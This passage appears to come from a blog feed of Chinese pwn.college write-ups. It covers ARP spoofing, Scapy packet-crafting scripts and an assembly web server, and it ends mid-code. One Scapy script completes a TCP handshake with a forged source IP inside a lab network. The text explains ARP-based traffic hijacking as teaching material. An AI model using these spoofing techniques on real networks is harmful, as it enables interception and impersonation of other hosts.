<strong>10.0.0.4</strong>）把数据包发送给 <strong>10.0.0.3</strong>。</li><li>这种攻击方式叫 <strong>ARP 欺骗</strong>，常见于中间人攻击（MITM）。</li></ul><h3 id="3-总结数据包发送过程"><a href="#3-总结数据包发送过程" class="headerlink" title="3. 总结数据包发送过程"></a>3. <strong>总结数据包发送过程</strong></h3><p>在你描述的情况下，当 <strong>10.0.0.3</strong> 绑定了 <strong>10.0.0.2</strong>，且 <strong>10.0.0.4</strong> 想与 <strong>10.0.0.2</strong> 建立连接，以下情况可能会发生：</p><ul><li><strong>如果 10.0.0.3 抢先响应 ARP 请求</strong>，或通过 ARP 欺骗修改了 <strong>10.0.0.4</strong> 的 ARP 表，<strong>10.0.0.4</strong> 会将数据包发送给 <strong>10.0.0.3</strong>。即使数据包的目标 IP 是 <strong>10.0.0.2</strong>，它们会通过 <strong>10.0.0.3</strong> 的 MAC 地址进行传输。</li><li><strong>如果没有 ARP 冲突且真正的 10.0.0.2 响应了 ARP 请求</strong>，则 <strong>10.0.0.4</strong> 的数据包会发送给真正的 <strong>10.0.0.2</strong>，不会被 <strong>10.0.0.3</strong> 接收到。</li></ul><p>因此，<strong>10.0.0.3</strong> 绑定 <strong>10.0.0.2</strong> 后，能否接收到 <strong>10.0.0.4</strong> 发送给 <strong>10.0.0.2</strong> 的数据包，取决于 ARP 表的状态以及 ARP 请求的响应情况。通过 ARP 欺骗，<strong>10.0.0.3</strong> 可以成功劫持流量。</p><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> Ether<span class="token punctuation">,</span> IP<span class="token punctuation">,</span> sendp<span class="token comment"># 构建以太网帧，设置type字段为0xFFFF</span>eth <span class="token operator">=</span> Ether<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token comment"># 构建IP层，目标地址为10.0.0.3</span>ip <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"10.0.0.3"</span><span class="token punctuation">)</span><span class="token comment"># 构建完整的以太网 + IP 报文</span>packet <span class="token operator">=</span> eth <span class="token operator">/</span> ip<span class="token comment"># 显示报文结构</span>packet<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 发送报文</span>sendp<span class="token punctuation">(</span>packet<span class="token punctuation">,</span> iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>完整的tcp三次握手</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> Ether<span class="token punctuation">,</span> IP<span class="token punctuation">,</span> TCP<span class="token punctuation">,</span> sendp<span class="token punctuation">,</span> send<span class="token punctuation">,</span> sr1<span class="token comment"># 构建IP层，目标地址为10.0.0.3</span>ip <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"10.0.0.3"</span><span class="token punctuation">,</span> src<span class="token operator">=</span><span class="token string">"10.0.0.2"</span><span class="token punctuation">)</span>tcp <span class="token operator">=</span> TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span><span class="token number">31337</span><span class="token punctuation">,</span> dport<span class="token operator">=</span><span class="token number">31337</span><span class="token punctuation">,</span> seq<span class="token operator">=</span><span class="token number">31337</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token comment"># 构建完整的以太网 + IP 报文</span>packet <span class="token operator">=</span> ip <span class="token operator">/</span> tcp <span class="token comment"># 显示报文结构</span>packet<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 发送报文</span>syn_ack <span class="token operator">=</span> sr1<span class="token punctuation">(</span>packet<span class="token punctuation">,</span>iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"syn_ack is :</span><span class="token interpolation"><span class="token punctuation">&#123;</span>syn_ack<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span> <span class="token comment"># 接收的报文flag 为[SA]</span>tcp <span class="token operator">=</span> TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span><span class="token number">31337</span><span class="token punctuation">,</span> dport<span class="token operator">=</span><span class="token number">31337</span><span class="token punctuation">,</span> seq<span class="token operator">=</span>syn_ack<span class="token punctuation">.</span>ack<span class="token punctuation">,</span> ack<span class="token operator">=</span>syn_ack<span class="token punctuation">.</span>seq<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token comment"># 构建完整的以太网 + IP 报文</span>packet <span class="token operator">=</span> ip <span class="token operator">/</span> tcp <span class="token comment"># 显示报文结构</span>packet<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 发送报文</span>send<span class="token punctuation">(</span>packet<span class="token punctuation">,</span>iface<span class="token operator">=</span><span class="token string">"eth0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-Web-2-Writeup</title>
      <link href="/2024/09/04/pwn-college-web-2-writeup/"/>
      <url>/2024/09/04/pwn-college-web-2-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h1><p><a href="https://pwn.college/intro-to-cybersecurity/building-a-web-server/">https://pwn.college/intro-to-cybersecurity/building-a-web-server/</a></p><h2 id="有价值的问题"><a href="#有价值的问题" class="headerlink" title="有价值的问题"></a>有价值的问题</h2><h3 id="1-fork调用"><a href="#1-fork调用" class="headerlink" title="1. fork调用"></a>1. fork调用</h3><p><code>fork()</code> 系统调用会创建一个新的进程，称为<strong>子进程</strong>。这个子进程是父进程的几乎完全复制品，因此，<code>fork()</code> 具有“一次调用，两个返回”的特点。</p><h4 id="fork-的工作原理："><a href="#fork-的工作原理：" class="headerlink" title="fork() 的工作原理："></a><code>fork()</code> 的工作原理：</h4><ol><li><strong>调用一次</strong>：在父进程中调用 <code>fork()</code> 系统调用。</li><li>返回两次：<ul><li>在父进程中，<code>fork()</code> 返回<strong>子进程的进程ID</strong>（<code>PID</code>），这是一个正整数。</li><li>在子进程中，<code>fork()</code> 返回<strong>0</strong>。</li></ul></li></ol><p>因此，<code>fork()</code> 一次调用会在两个不同的进程中分别返回不同的值。</p><h4 id="子进程和父进程的状态："><a href="#子进程和父进程的状态：" class="headerlink" title="子进程和父进程的状态："></a>子进程和父进程的状态：</h4><p>在 <code>fork()</code>调用之后，子进程和父进程的状态<strong>几乎一致</strong>，但是有以下几点需要注意：</p><ol><li><strong>进程地址空间的复制</strong>：<ul><li>子进程会复制父进程的整个地址空间，包括代码段、数据段、堆、栈等。但这种复制是<strong>写时复制</strong>（Copy-on-Write，COW），也就是说在子进程和父进程修改内存之前，它们共享同一块物理内存。一旦有进程对某块内存进行写操作，才会真正复制该内存块。</li></ul></li><li><strong>文件描述符</strong>：<ul><li>子进程继承父进程的文件描述符表。子进程中的文件描述符与父进程中的文件描述符指向相同的文件，且文件的偏移量和权限也是相同的。不过，两者是独立的，父进程和子进程可以独立关闭这些文件描述符。</li></ul></li><li><strong>不同点</strong>：<ul><li><strong>进程ID</strong>：子进程拥有与父进程不同的进程ID (<code>PID</code>)。父进程可以通过 <code>fork()</code> 的返回值（子进程的 <code>PID</code>）来区分自己和子进程。</li><li>**父进程ID (<code>PPID</code>)**：子进程的父进程ID为调用 <code>fork()</code> 的父进程的进程ID。</li><li><strong>返回值不同</strong>：如上所述，父进程的 <code>fork()</code> 返回子进程的PID，而子进程返回值是 0，用于区分它们。</li></ul></li><li><strong>进程的独立性</strong>：<ul><li>子进程和父进程在 <code>fork()</code> 后是两个独立的进程，彼此不受影响。它们可以独立执行代码，并且对变量和内存的修改不会互相影响（除非通过某些共享内存机制）。</li></ul></li></ol><h4 id="fork-的返回值判断流程："><a href="#fork-的返回值判断流程：" class="headerlink" title="fork() 的返回值判断流程："></a><code>fork()</code> 的返回值判断流程：</h4><p>通常情况下，<code>fork()</code> 的返回值用于区分父进程和子进程，典型的处理方式如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">pid_t</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 发生错误，fork() 失败</span>    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fork failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 这是子进程</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This is the child process with PID %d\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 这是父进程，pid 是子进程的 PID</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This is the parent process, child PID is %d\n"</span><span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过这个机制，程序可以在 <code>fork()</code> 之后让父进程和子进程执行不同的逻辑。</p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><ul><li><code>fork()</code> 会创建一个几乎与父进程相同的子进程。</li><li>父进程返回子进程的 <code>PID</code>，子进程返回 0。</li><li>父子进程的内存、文件描述符等初始状态是相同的，但它们是独立的进程，可以执行不同的代码逻辑。</li></ul><h3 id="2-一些汇编指令讲解"><a href="#2-一些汇编指令讲解" class="headerlink" title="2. 一些汇编指令讲解"></a>2. 一些汇编指令讲解</h3><table><thead><tr><th>指令</th><th>作用</th></tr></thead><tbody><tr><td>testq %rax, %rax</td><td>指令是用于执行按位逻辑<strong>与</strong>（AND）操作，但<strong>不保存结果</strong>，仅影响处理器的标志位（如零标志、符号标志等）。这条指令的作用是通过逻辑与操作来<strong>检查寄存器的值</strong>，并<strong>更新处理器状态标志</strong>（但不会修改寄存器的值本身）。结合条件跳转指令，je、jne、jg、jl等进行逻辑跳转</td></tr><tr><td>repe cmpsb</td><td><code>cmpsb</code> 用于比较两个字符串的字节。比较 <code>[ESI]</code> 和 <code>[EDI]</code> 的内容。无论结果如何，<code>cmpsb</code> 都会自动递增或递减 <code>ESI</code> 和 <code>EDI</code>，以指向下一个字节。增量或减量取决于方向标志（DF），默认是递增。<code>repe</code> 是字符串操作指令的前缀，表示 “Repeat while equal”（当相等时重复）。</td></tr><tr><td>stosb</td><td>将 <code>AL</code> 寄存器中的值存储到由 <code>EDI</code> 寄存器指向的内存地址中。</td></tr><tr><td>scasb</td><td>将 <code>AL</code>寄存器中的字节与 <code>RDI</code>或 <code>EDI</code>所指向的内存字节进行比较</td></tr><tr><td>lodsb</td><td>从源内存位置 <code>RSI</code>加载一个字节到AL寄存器中，并根据DF方向标志的值更新源指针RSI或ESI</td></tr></tbody></table><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">mov ecx, 5               # 需要比较的字节数mov esi, source_string   # 第一个字符串的地址mov edi, target_string   # 第二个字符串的地址repe cmpsb               # 比较这两个字符串mov al, 0x00        # 将字节 0 载入 ALmov edi, buffer     # 将缓冲区地址加载到 EDImov ecx, 100        # 设置要存储的字节数rep stosb           # 将 AL 中的值存入 [EDI] 开始的 100 个字节中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-starce工具"><a href="#3-starce工具" class="headerlink" title="3. starce工具"></a>3. starce工具</h3><p>starce用于追踪和现实一个进程或多个进程的系统调用。</p><h3 id="4-as与nasm的区别？"><a href="#4-as与nasm的区别？" class="headerlink" title="4. as与nasm的区别？"></a>4. as与nasm的区别？</h3><p><code>as</code> 和 <code>nasm</code> 是两种不同的汇编器，它们使用不同的语法和指令集。以下是它们的主要区别：</p><h4 id="1-语法风格"><a href="#1-语法风格" class="headerlink" title="1. 语法风格"></a>1. <strong>语法风格</strong></h4><ul><li><strong><code>as</code> (GNU Assembler)</strong>:<ul><li><strong>语法风格</strong>: <code>as</code> 默认使用 AT&amp;T 语法。</li><li><strong>寄存器</strong>: 在 AT&amp;T 语法中，寄存器名前面带有 <code>%</code> 符号。例如，<code>%eax</code>、<code>%ebx</code>。</li><li><strong>操作数顺序</strong>: AT&amp;T 语法中，操作数的顺序是 <code>源, 目的</code>。例如，<code>mov %eax, %ebx</code> 将 <code>eax</code> 的值移动到 <code>ebx</code>。</li><li><strong>常量</strong>: 常量前面带有 <code>$</code> 符号。例如，<code>$1</code> 表示常量 <code>1</code>。</li></ul></li><li><strong><code>nasm</code> (Netwide Assembler)</strong>:<ul><li><strong>语法风格</strong>: <code>nasm</code> 使用 Intel 语法。</li><li><strong>寄存器</strong>: 在 Intel 语法中，寄存器名不带任何前缀。例如，<code>eax</code>、<code>ebx</code>。</li><li><strong>操作数顺序</strong>: Intel 语法中，操作数的顺序是 <code>目的, 源</code>。例如，<code>mov ebx, eax</code> 将 <code>eax</code> 的值移动到 <code>ebx</code>。</li><li><strong>常量</strong>: 常量直接写出，不需要前缀。例如，<code>1</code> 表示常量 <code>1</code>。</li></ul></li></ul><h4 id="2-伪指令和宏"><a href="#2-伪指令和宏" class="headerlink" title="2. 伪指令和宏"></a>2. <strong>伪指令和宏</strong></h4><ul><li><strong><code>as</code></strong>:<ul><li>使用 <code>.section</code> 来定义数据段和代码段。</li><li>使用 <code>.equ</code> 来定义常量。</li><li>支持更复杂的伪指令和宏指令。</li></ul></li><li><strong><code>nasm</code></strong>:<ul><li>使用 <code>section</code> 来定义数据段和代码段。</li><li>使用 <code>equ</code> 来定义常量。</li><li>提供了一些不同的宏功能和伪指令，比如 <code>%define</code>。</li></ul></li></ul><h4 id="3-目标文件格式"><a href="#3-目标文件格式" class="headerlink" title="3. 目标文件格式"></a>3. <strong>目标文件格式</strong></h4><ul><li><code>as</code>:<ul><li><code>as</code> 默认生成 ELF 格式的目标文件 (<code>.o</code>)，但可以通过选项指定其他格式。</li></ul></li><li><code>nasm</code>:<ul><li><code>nasm</code> 可以生成多种格式的目标文件，包括 ELF、COFF、PE、Mach-O 等，可以通过 <code>-f</code> 选项指定，例如 <code>nasm -f elf file.asm</code>。</li></ul></li></ul><h4 id="4-系统调用和调用约定"><a href="#4-系统调用和调用约定" class="headerlink" title="4. 系统调用和调用约定"></a>4. <strong>系统调用和调用约定</strong></h4><ul><li><code>as</code>:<ul><li>在 Linux 下，<code>as</code> 的语法更接近 Unix 系统原生使用的汇编代码，尤其是涉及系统调用、链接和调试时。</li></ul></li><li><code>nasm</code>:<ul><li><code>nasm</code> 的 Intel 语法更加简洁易读，尤其对于编写裸机代码或 Windows 下的程序。</li></ul></li></ul><h4 id="5-编译和链接流程"><a href="#5-编译和链接流程" class="headerlink" title="5. 编译和链接流程"></a>5. <strong>编译和链接流程</strong></h4><ul><li><strong><code>as</code></strong>:<ul><li>通常与 <code>gcc</code> 或 <code>ld</code> 配合使用，直接生成目标文件。</li><li>例子：<code>as source.s -o source.o</code> 然后 <code>ld source.o -o output</code>。</li></ul></li><li><strong><code>nasm</code></strong>:<ul><li>可以生成各种格式的目标文件，需指定格式。</li><li>例子：<code>nasm -f elf32 source.asm -o source.o</code> 然后 <code>ld -m elf_i386 source.o -o output</code>。</li></ul></li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><code>as</code> 和 <code>nasm</code> 都是强大的汇编器，但它们适用于不同的场景和风格。<code>as</code> 更适合与 GNU 工具链配合使用，尤其在 Linux 系统编程中；<code>nasm</code> 则以其简洁的 Intel 语法受到许多编写裸机代码和跨平台开发者的青睐。选择哪一个主要取决于你的项目需求和个人偏好。</p><h3 id="5-汇编语言的中包含系统调用，在ld进行编译的时候，都会链接什么文件？"><a href="#5-汇编语言的中包含系统调用，在ld进行编译的时候，都会链接什么文件？" class="headerlink" title="5. 汇编语言的中包含系统调用，在ld进行编译的时候，都会链接什么文件？"></a>5. 汇编语言的中包含系统调用，在ld进行编译的时候，都会链接什么文件？</h3><p>在使用 <code>ld</code> 对包含系统调用的汇编语言代码进行编译时，链接器会将你的汇编代码与一些标准的系统库和启动代码（startup code）进行链接。以下是 <code>ld</code> 链接时通常涉及的文件和步骤：</p><h4 id="1-启动代码-Startup-Code"><a href="#1-启动代码-Startup-Code" class="headerlink" title="1. 启动代码 (Startup Code)"></a>1. <strong>启动代码 (Startup Code)</strong></h4><ul><li><p>启动代码</p><p>是在程序开始执行前，由操作系统加载并调用的一段代码。它负责初始化程序的执行环境，如设置堆栈、清除数据段、调用构造函数等。启动代码的典型文件是：</p><ul><li><strong><code>crt1.o</code></strong> (C runtime): 这个文件包含程序的入口点代码 (<code>_start</code>)，它最终会调用程序的 <code>main</code> 函数（如果是 C 代码）或直接开始执行汇编代码。</li><li><strong><code>crti.o</code> 和 <code>crtn.o</code></strong>: 这些文件包含初始化和终止代码，它们会在程序开始执行之前和程序结束时运行。</li></ul></li></ul><h4 id="2-系统调用接口"><a href="#2-系统调用接口" class="headerlink" title="2. 系统调用接口"></a>2. <strong>系统调用接口</strong></h4><ul><li><strong>系统调用 (syscall) 接口</strong> 是由内核提供的，用于程序与操作系统交互。它们通常是由汇编语言直接调用的，或通过 C 标准库进行封装。</li><li>如果你在汇编代码中使用了系统调用，例如 <code>int 0x80</code>（对于旧版 x86 Linux 系统），你直接与内核交互，不需要额外链接什么特别的库文件。</li><li><strong>标准 C 库 (<code>libc.so</code>)</strong>: 如果你使用了标准库中的函数（如 <code>printf</code>），则会链接到标准 C 库。这通常是动态链接库。</li></ul><h4 id="3-动态链接器-Dynamic-Linker"><a href="#3-动态链接器-Dynamic-Linker" class="headerlink" title="3. 动态链接器 (Dynamic Linker)"></a>3. <strong>动态链接器 (Dynamic Linker)</strong></h4><ul><li>如果你链接了动态库，例如 <code>libc.so</code>，那么链接器会在最终的可执行文件中嵌入指向动态链接器的引用（如 <code>/lib/ld-linux.so.x</code>），它会在程序启动时运行，加载动态链接库。</li></ul><h4 id="4-标准库文件"><a href="#4-标准库文件" class="headerlink" title="4. 标准库文件"></a>4. <strong>标准库文件</strong></h4><ul><li><strong>libc.so</strong>: 标准 C 库（动态或静态），包含大量常用函数和系统调用封装。</li><li><strong>ld-linux.so.x</strong>: 动态链接器，在运行时加载和链接动态库。</li><li><strong>libgcc.a</strong> 或 <strong>libgcc_s.so</strong>: GCC 的运行时支持库，提供某些平台相关的低级支持功能。</li></ul><h4 id="5-符号表-Symbol-Table"><a href="#5-符号表-Symbol-Table" class="headerlink" title="5. 符号表 (Symbol Table)"></a>5. <strong>符号表 (Symbol Table)</strong></h4><ul><li>链接器会解析所有未定义的符号，确保它们能在已链接的文件中找到定义。如果找不到符号定义，链接器会报错（未定义符号错误）。</li></ul><h4 id="6-链接器脚本-Linker-Script"><a href="#6-链接器脚本-Linker-Script" class="headerlink" title="6. 链接器脚本 (Linker Script)"></a>6. <strong>链接器脚本 (Linker Script)</strong></h4><ul><li>链接器脚本控制链接器的行为。默认情况下，<code>ld</code> 使用一个标准链接器脚本，定义了内存布局和段分配，但你也可以编写自定义的链接器脚本来控制细节。</li></ul><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>当你使用 <code>ld</code> 来链接包含系统调用的汇编程序时，主要会链接以下内容：</p><ol><li><strong>启动代码文件</strong> (<code>crt1.o</code>, <code>crti.o</code>, <code>crtn.o</code>) - 初始化程序的执行环境。</li><li><strong>系统调用接口或标准库</strong> (<code>libc.so</code>, <code>libgcc_s.so</code>) - 如果你使用了标准库中的函数。</li><li><strong>动态链接器</strong> (<code>ld-linux.so.x</code>) - 在运行时加载和链接动态库。</li><li><strong>符号解析</strong> - 确保所有符号在链接的库或对象文件中被正确解析。</li></ol><p>如果你的汇编程序直接调用系统调用，而没有依赖标准库函数，那么链接器可能只需要处理启动代码，而不需要链接到标准库。<br>5. AT&amp;T语法和Intel语法的区别</p><h4 id="1-操作数顺序"><a href="#1-操作数顺序" class="headerlink" title="1. 操作数顺序"></a>1. <strong>操作数顺序</strong></h4><p>在 AT&amp;T 语法中，指令的源操作数在前，目标操作数在后。例如：</p><ul><li><strong>Intel 语法</strong>: <code>MOV EAX, EBX</code> （将 <code>EBX</code> 的值移动到 <code>EAX</code> 中）</li><li><strong>AT&amp;T 语法</strong>: <code>movl %ebx, %eax</code> （将 <code>%ebx</code> 的值移动到 <code>%eax</code> 中）</li></ul><h4 id="2-寄存器和内存操作数的前缀"><a href="#2-寄存器和内存操作数的前缀" class="headerlink" title="2. 寄存器和内存操作数的前缀"></a>2. <strong>寄存器和内存操作数的前缀</strong></h4><p>AT&amp;T 语法中，寄存器名称以 <code>%</code> 开头，而内存操作数的寄存器名称以 <code>(%reg)</code> 的形式出现。</p><ul><li><strong>寄存器</strong>: <code>%eax</code>, <code>%ebx</code>, <code>%ecx</code>, <code>%edx</code>（32位寄存器）</li><li><strong>内存</strong>: <code>(%eax)</code> 表示内存地址由 <code>eax</code> 寄存器指定</li></ul><h4 id="3-指令后缀"><a href="#3-指令后缀" class="headerlink" title="3. 指令后缀"></a>3. <strong>指令后缀</strong></h4><p>指令的后缀表示操作数的大小（字节、字、双字、四字）。常见的后缀包括：</p><ul><li><code>b</code> 表示字节（8位）</li><li><code>w</code> 表示字（16位）</li><li><code>l</code> 表示双字（32位）</li><li><code>q</code> 表示四字（64位）</li></ul><p>例如：</p><ul><li><code>movb %al, %bl</code> （8位寄存器之间移动数据）</li><li><code>movw %ax, %bx</code> （16位寄存器之间移动数据）</li><li><code>movl %eax, %ebx</code> （32位寄存器之间移动数据）</li><li><code>movq %rax, %rbx</code> （64位寄存器之间移动数据）</li></ul><h4 id="4-立即数和寄存器"><a href="#4-立即数和寄存器" class="headerlink" title="4. 立即数和寄存器"></a>4. <strong>立即数和寄存器</strong></h4><p>立即数（常数值）在 AT&amp;T 语法中以 <code>$</code> 开头。例如：</p><ul><li><code>movl $5, %eax</code> （将常数值 5 移动到 <code>%eax</code> 中）</li></ul><h4 id="5-内存地址模式"><a href="#5-内存地址模式" class="headerlink" title="5. 内存地址模式"></a>5. <strong>内存地址模式</strong></h4><p>AT&amp;T 语法中的内存地址模式使用 <code>base + index*scale + displacement</code> 形式。例如：</p><ul><li><code>movl 8(%ebp), %eax</code> （将从 <code>%ebp</code> 寄存器偏移 8 字节的内存值移动到 <code>%eax</code> 中）</li></ul><h2 id="总体代码"><a href="#总体代码" class="headerlink" title="总体代码"></a>总体代码</h2><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.section .datadomain:    .int 2                # AF_INETtype:      .int 1                # SOCK_STREAMprotocol:  .int 0                # IPPROTO_IPsocketfd:  .quad 0               # socketfdclientfd:  .quad 0               # clientfdopenfilefd:  .quad 0              # openfilefdfilecontentlen:  .quad 0          # filecontentlencontentlen:  .quad 0              # contentlenresponse:  .asciz &quot;HTTP&#x2F;1.0 200 OK\r\n\r\n&quot;responsefile:  .space 1000           # 文件请求中文件内容缓冲区filecontent:  .space 1000           # 文件请求中文件内容缓冲区contentlenbuffer: .space 10         # 请求包中文件长度的存储缓冲区filepath: .space 256            # 字符串长度buffer:    .space 1000           # 请求数据包缓冲区get_str:   .asciz &quot;GET &quot;         # &quot;GET &quot;字符串post_str:   .asciz &quot;POST &quot;       # &quot;POST &quot;字符串content_length_str: .asciz &quot;Content-Length: &quot;content_length_str_len: .quad 16endmark: .space 1            # 空格字符.section .text.global _start_start:    # 创建套接字    movl $2, %edi                # 第一个参数: domain (AF_INET)    movl $1, %esi                # 第二个参数: type (SOCK_STREAM)    movl $0, %edx                # 第三个参数: protocol (IPPROTO_IP)    movl $41, %eax               # 系统调用号: socket (41 in x86_64)    syscall                      # 触发系统调用    # 保存套接字描述符    movq %rax, %rdi              # 将返回的文件描述符保存在rdi中    movq %rax, socketfd(%rip)          # 将文件描述符保存在socketfd中    # 准备sockaddr_in结构    movq $16, %rdx               # 第三个参数: struct sockaddr的长度    leaq sockaddr(%rip), %rsi    # 第二个参数: struct sockaddr指针    # 绑定套接字    movl $49, %eax               # 系统调用号: bind (49 in x86_64)    syscall                      # 触发系统调用listen:    # 监听    movq socketfd(%rip), %rdi    movq $0, %rsi                # listen(socketfd, max_listen_num)    movq $0x32, %rax             # 系统调用号 listen    syscall                      # 触发系统调用accept:    # 创建连接    movq $0x2B, %rax            # accept(socketfd, address, addrlen)    xor %rdx, %rdx    xor %rsi, %rsi    movq socketfd(%rip), %rdi    syscall    movq  %rax, clientfd(%rip)    # 创建子进程    movq $57, %rax             # 系统调用号 fork    syscall    testq %rax, %rax    jnz parent_process    call handle_clienthandle_client:    # 在子进程中关闭socketfd文件描述符    movq socketfd(%rip), %rdi    movq $3, %rax    syscall    # 读取响应    movq clientfd(%rip), %rdi    leaq buffer(%rip), %rsi    # read(fd, response, size(response))    movq $1000, %rdx    movq $0, %rax    syscall    movq $3, %rcx    leaq buffer(%rip), %rsi    leaq get_str(%rip), %rdi    movb $0, %al    repe cmpsb    je get_handle    movq $4, %rcx    leaq buffer(%rip), %rsi    leaq post_str(%rip), %rdi    movb $0, %al    repe cmpsb    je post_handle    # 子进程退出    movl $60, %eax               # 系统调用号: exit (60 in x86_64)    xorl %edi, %edi              # 返回代码0    syscall                      # 触发系统调用get_handle:    # 初始化指针和寄存器    movq $4, %rcx                     # 需要匹配 &quot;POST &quot; 的长度    movq %rcx, %r10                    # 保留rcx的副本    leaq buffer(%rip), %rsi           # rsi 指向 buffer  要查找的内容    leaq get_str(%rip), %rdi         # rdi 指向 &quot;POST &quot; 字符串    leaq filepath(%rip), %rdx         # 保存POST请求后面的文件路径---从匹配字符后到结束符号前，的字节数据的保存地址    xor %r8, %r8    movb $&#39; &#39;, endmark(%rip)    leaq endmark(%rip), %r8           # 结束标志    call find_get      # 打开文件    leaq filepath(%rip), %rdi    movq $0, %rsi    movq $0, %rdx    movq $2, %rax    syscall    movq %rax, openfilefd(%rip)    # 读取文件    leaq filecontent(%rip), %rsi    movq %rax, %rdi    movq $1000, %rdx    movq $0, %rax    syscall    movq %rax, filecontentlen(%rip)    # 关闭文件    movq $3, %rax    movq openfilefd(%rip), %rdi    syscall      # 写入响应1    movq clientfd(%rip), %rdi    leaq response(%rip), %rsi    # write(fd, response, size(response))    movq $19, %rdx    movq $1, %rax    syscall    # 写入响应2    movq clientfd(%rip), %rdi    leaq filecontent(%rip), %rsi    # write(fd, response, size(response))    movq filecontentlen(%rip), %rdx    movq $1, %rax    syscall    # 子进程退出    movq clientfd(%rip), %rdi    movq $3, %rax    syscall    movl $60, %eax               # 系统调用号: exit (60 in x86_64)    xorl %edi, %edi              # 返回代码0    syscall                      # 触发系统调用post_handle:    # 初始化指针和寄存器    movq $5, %rcx                     # 需要匹配 &quot;POST &quot; 的长度    movq %rcx, %r10                    # 保留rcx的副本    leaq buffer(%rip), %rsi           # rsi 指向 buffer  要查找的内容    leaq post_str(%rip), %rdi         # rdi 指向 &quot;POST &quot; 字符串    leaq filepath(%rip), %rdx         # 保存POST请求后面的文件路径---从匹配字符后到结束符号前，的字节数据的保存地址    xor %r8, %r8    movb $&#39; &#39;, endmark(%rip)    leaq endmark(%rip), %r8           # 结束标志    call find_get       movq $16, %rcx                     # 需要匹配 &quot;POST &quot; 的长度    movq %rcx, %r10                    # 保留rcx的副本    leaq buffer(%rip), %rsi           # rsi 指向 buffer  要查找的内容    leaq content_length_str(%rip), %rdi         # rdi 指向 &quot;POST &quot; 字符串    leaq contentlenbuffer(%rip), %rdx         # 保存POST请求后面的文件路径---从匹配字符后到结束符号前，的字节数据的保存地址    xor %r8, %r8    movb $&#39;\r&#39;, endmark(%rip)    leaq 